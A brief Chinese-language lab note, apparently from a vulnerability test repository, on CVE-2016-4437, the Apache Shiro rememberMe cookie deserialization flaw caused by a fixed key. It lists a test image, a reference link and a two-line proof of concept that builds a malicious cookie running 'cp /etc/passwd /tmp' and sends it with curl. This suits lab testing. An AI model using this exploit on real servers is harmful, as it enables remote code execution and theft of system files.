### CVE-2016-4437 - Shiro rememberMe cookie 固定秘钥反序列化漏洞

测试镜像

* src/shiro/1.2.4/

参考链接

* [Apache Shiro Java 反序列化漏洞分析](http://blog.knownsec.com/2016/08/apache-shiro-java/)

Poc

```
# 使用 jdku21 gadget

python2.7 /root/build-cookie.py "cp /etc/passwd /tmp"
curl 127.0.0.1/shiro/ -H "Cookie: $(cat /tmp/cookie.txt)"
```

